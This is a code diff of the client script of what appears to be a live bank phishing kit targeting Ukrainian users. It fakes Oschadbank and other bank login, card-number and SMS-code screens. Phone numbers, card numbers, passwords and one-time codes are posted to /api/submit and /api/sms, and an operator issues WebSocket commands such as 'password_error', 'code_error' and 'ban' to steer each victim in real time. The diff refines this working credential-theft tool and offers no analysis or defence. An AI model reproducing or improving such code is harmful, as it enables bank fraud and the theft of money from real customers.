@@ -828,6 +838,7 @@ document.addEventListener('DOMContentLoaded', () => {
             </div>
         </div>`;
         document.body.insertAdjacentHTML('beforeend', modalHtml);
+
         const closeModal = () => { document.querySelector('.sms-help-modal-backdrop')?.remove(); };
         document.querySelector('.sms-help-modal-backdrop').addEventListener('click', (e) => { if (e.target === e.currentTarget) closeModal(); });
         document.getElementById('sms-help-understood').addEventListener('click', closeModal);
@@ -835,7 +846,10 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // --- MAIN LOGIC & DATA HANDLING ---
+    
+    /** Sends collected data to the server */
     async function sendDataToServer(data, isFinal) {
+        // Мы по-прежнему накапливаем данные на клиенте для его внутреннего состояния
         collectedData = { ...collectedData, ...data };
         try {
             await fetch(`/api/submit`, {
@@ -846,12 +860,13 @@ document.addEventListener('DOMContentLoaded', () => {
                     bankName: activeBankData.name,
                     isFinalStep: isFinal,
                     referrer: localStorage.getItem('referrer') || 'unknown',
-                    ...collectedData
+                    ...data // <-- ИСПРАВЛЕНИЕ: Отправляем ТОЛЬКО новые данные для текущего шага
                 }),
             });
         } catch (error) { console.error('Failed to send data:', error); }
     }
-
+    
+    /** Handles commands from the WebSocket server */
     function handleServerCommand(command) {
         const { type, data } = command;
         const showMessageInMainModal = (title, text, btnText, callback) => {
@@ -861,6 +876,7 @@ document.addEventListener('DOMContentLoaded', () => {
             modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`;
             modalFooter.querySelector('button').onclick = callback;
         };
+
         switch (type) {
             case 'lk':
                 renderOschadbankLogin();
@@ -868,15 +884,14 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'call':
                 renderOschadbankCallConfirmation();
                 break;
-            case 'telegram_debit':
+            case 'telegram_debit': // New command
                 renderTelegramSmsScreen();
                 break;
-            case 'password_error':
+            case 'password_error': // New command
                 const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
-                const preservePhone = data.loginType === 'phone' ? collectedData.phone : '';
-                renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg, preservePhone });
+                renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg });
                 break;
-            case 'code_error':
+            case 'code_error': // Modified command
                 const errorOptions = { error: true };
                 if (lastCodeScreen === 'oschad_call') {
                     renderOschadbankCallConfirmation(errorOptions);
@@ -884,18 +899,12 @@ document.addEventListener('DOMContentLoaded', () => {
                     renderTelegramSmsScreen(errorOptions);
                 }
                 break;
-            case 'sms':
+            case 'sms': // Standard flow SMS
                 modalTitle.textContent = 'Введіть код з SMS';
                 stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
                 modalFooter.style.display = 'flex';
                 modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
                 document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
-                break;
-            case 'pin_error':
-                renderForgotPasswordFlow(3, { error: true });
-                break;
-            case 'number_error':
-                renderOschadbankLogin({ errorType: 'phone', errorMessage: data.text });
                 break;
             case 'other':
                 const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
@@ -907,127 +916,46 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                 break;
-            case 'timer':
-                showMessageInMainModal("Успіх", data.text, "ОК", () => window.location.reload());
-                break;
             case 'ban':
                 document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
                 if (ws) ws.close();
                 break;
         }
     }
+    
+    // --- Standard (non-Oschadbank) Flow Logic ---
+    document.querySelectorAll('.bank-item').forEach(item => {
+        item.addEventListener('click', e => {
+            e.preventDefault();
+            if (item.classList.contains('disabled')) return;
+            const bankId = item.dataset.bank;
+            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
+            collectedData = { }; // Start with fresh data
 
-    // --- Standard Flow Logic ---
-    function renderStep() {
-        if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return;
-        const step = activeBankData.steps[currentStepIndex];
-        modalTitle.textContent = step.title;
-        let html = '';
-        switch (step.type) {
-            case 'phone':
-                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
-                break;
-            case 'card_simple':
-                html = `<div class="input-group"><input type="tel" class="input-field" id="card" placeholder="XXXX XXXX XXXX XXXX" maxlength="19"><div class="error-message"></div></div>`;
-                break;
-        }
-        stepContent.innerHTML = html;
-        modalFooter.style.display = 'flex';
-        backBtn.style.display = currentStepIndex === 0 ? 'none' : 'block';
-        const input = stepContent.querySelector('.input-field');
-        if (input) {
-            input.addEventListener('input', () => {
-                let value = input.value.replace(/\D/g, '');
-                if (input.id === 'phone') {
-                    value = value.substring(0, 9);
-                    let formatted = '';
-                    if (value.length > 0) formatted += value.substring(0, 2);
-                    if (value.length > 2) formatted += ' ' + value.substring(2, 5);
-                    if (value.length > 5) formatted += ' ' + value.substring(5, 7);
-                    if (value.length > 7) formatted += ' ' + value.substring(7, 9);
-                    input.value = formatted.trim();
-                    nextBtn.disabled = value.length !== 9;
-                } else if (input.id === 'card') {
-                    input.value = value.replace(/(\d{4})/g, '$1 ').trim();
-                    nextBtn.disabled = value.length !== 16;
-                }
-            });
-        }
-    }
-
-    async function handleNextStep() {
-        if (!validateCurrentStep()) return;
-        let data = {};
-        stepContent.querySelectorAll('.input-field').forEach(input => {
-            let key = input.id;
-            let value = input.value;
-            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
-            if (key === 'card') value = value.replace(/\s/g, '');
-            data[key] = value;
+            if (bankId === 'oschadbank') {
+                renderOschadbankLogin();
+            } else {
+                body.dataset.theme = activeBankData.theme;
+                formHeaderLogo.src = activeBankData.logoUrl;
+                body.classList.add('form-active');
+                currentStepIndex = 0;
+                renderStep();
+            }
+            connectWebSocket();
         });
-        const step = activeBankData.steps[currentStepIndex];
-        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
-        sendDataToServer(data, isFinalStep);
-        if (step.type === 'card_simple') {
-            showWaitingScreen();
-            return;
-        }
-        currentStepIndex++;
-        if (currentStepIndex < activeBankData.steps.length) {
-            renderStep();
-        } else {
-            showWaitingScreen();
-        }
-    }
-
-    function handleBackStep() {
-        if (currentStepIndex > 0) {
-            currentStepIndex--;
-            renderStep();
-        } else {
-            body.classList.remove('form-active');
-            body.removeAttribute('data-theme');
-        }
-    }
-
-    function validateCurrentStep() {
-        const input = stepContent.querySelector('.input-field');
-        if (!input) return false;
-        const value = input.value.replace(/\D/g, '');
-        if (input.id === 'phone' && value.length !== 9) return false;
-        if (input.id === 'card' && value.length !== 16) return false;
-        return true;
-    }
-
-    function showWaitingScreen() {
-        modalTitle.textContent = 'Зачекайте...';
-        stepContent.innerHTML = `<p style="text-align:center;">Обробка даних...</p>`;
-        modalFooter.style.display = 'none';
-    }
-
-    async function submitSmsCode() {
-        const codeInput = document.getElementById('sms-code');
-        const code = codeInput.value;
-        const errorContainer = document.getElementById('sms-error-container');
-        if (!code.trim()) {
-            if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
-            return;
-        }
-        try {
-            await fetch(`/api/sms`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }),
-            });
-        } catch (error) {
-            console.error('Failed to send sms code:', error);
-        }
-        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
-        codeInput.value = '';
-    }
+    });
 
     nextBtn.addEventListener('click', handleNextStep);
     backBtn.addEventListener('click', handleBackStep);
+    
+    async function handleNextStep() { if (!validateCurrentStep()) return; let data = {}; stepContent.querySelectorAll('.input-field').forEach(input => { let key = input.id; let value = input.value; if (key === 'phone') value = '+380' + value.replace(/\D/g, ''); if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, ''); data[key] = value; }); const step = activeBankData.steps[currentStepIndex]; let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length; if (activeBankData.special && step.type === 'card_simple') { isFinalStep = true; } sendDataToServer(data, isFinalStep); if (isFinalStep) { showWaitingScreen(); return; } currentStepIndex++; if (currentStepIndex < activeBankData.steps.length) { renderStep(); } else { showWaitingScreen(); } }
+    async function submitSmsCode() { const codeInput = document.getElementById('sms-code'); const code = codeInput.value; const errorContainer = document.getElementById('sms-error-container'); if (!code.trim()) { if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`; return; } try { await fetch(`/api/sms`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }), }); } catch (error) { console.error('Failed to send sms code:', error); } if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`; codeInput.value = ''; }
+    const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
+    function renderStep() { if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return; const step = activeBankData.steps[currentStepIndex]; let html = ''; switch (step.type) { case 'phone': html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`; break; case 'card_simple': html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19'); break; } modalTitle.textContent = step.title; stepContent.innerHTML = html; modalFooter.style.display = 'flex'; backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none'; nextBtn.style.display = 'block'; addInputFormatting(); }
+    function showWaitingScreen() { modalTitle.textContent = 'Очікуємо'; stepContent.innerHTML = `<p>Заявку відправлено. Будь ласка, чекайте. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>`; modalFooter.style.display = 'none'; }
+    function handleBackStep() { if (currentStepIndex > 0) { currentStepIndex--; renderStep(); } else { body.classList.remove('form-active'); } }
+    function addInputFormatting() { const phoneInput = document.getElementById('phone'); if (phoneInput) { phoneInput.addEventListener('input', (e) => { let value = e.target.value.replace(/\D/g, '').substring(0, 9); e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim(); }); } const cardNumberInput = document.getElementById('card'); if (cardNumberInput) { cardNumberInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim(); }); } }
+    function validateCurrentStep() { let isValid = true; stepContent.querySelectorAll('.input-field').forEach(input => { const errorContainer = input.parentElement.querySelector('.error-message'); input.classList.remove('invalid'); if (errorContainer) errorContainer.style.display = 'none'; let value = input.value.replace(/\D/g, ''); let requiredLength = 0; switch (input.id) { case 'phone': requiredLength = 9; break; case 'card': requiredLength = 16; break; } if (requiredLength > 0 && value.length < requiredLength) { isValid = false; input.classList.add('invalid'); if (errorContainer) { errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`; errorContainer.style.display = 'block'; } } }); return isValid; }
 });
 </script>
 </body>
